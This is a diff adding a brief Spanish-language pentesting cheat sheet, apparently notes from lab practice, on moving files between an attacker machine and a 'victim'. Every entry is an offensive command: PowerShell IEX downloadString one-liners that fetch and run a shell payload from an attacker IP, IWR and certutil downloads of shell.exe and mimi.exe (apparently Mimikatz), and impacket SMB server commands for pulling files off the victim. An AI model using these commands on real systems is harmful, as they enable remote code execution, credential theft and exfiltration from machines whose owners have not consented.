@@ -1,0 +1,23 @@
+# Es distinto transferir archivos de otro tipo en vez de .exe
+
+# En .exe debemos de pasar asi los archivos debido a que de la forma habitual no funciona
+
+# Habitual
+IEX(New-Object Net.WebClient).downloadString("http://10.10.14.36/shell.exe")
+IEX(New-Object Net.WebClient).downloadString("http://10.10.14.36/PS.ps1")
+
+# .EXE
+IWR -uri http://10.10.14.36/shell.exe -OutFile shell.exe
+certutil.exe -f -urlcache -split http://10.10.14.36/mimi.exe
+
+# Transferir archivos de la victima a tu pc
+
+# Mi server -> sudo impacket-smbserver smbFolder $(pwd) -smb2support
+# Victima -> copy <archivo> \\10.10.14.36\smbFolder\<archivo>
+
+# Transferir archivos de tu pc a la victima
+
+# Mi server -> sudo impacket-smbserver smbFolder $(pwd) -smb2support
+# Victima -> copy \\10.10.14.36\smbFolder\<archivo>
+
+
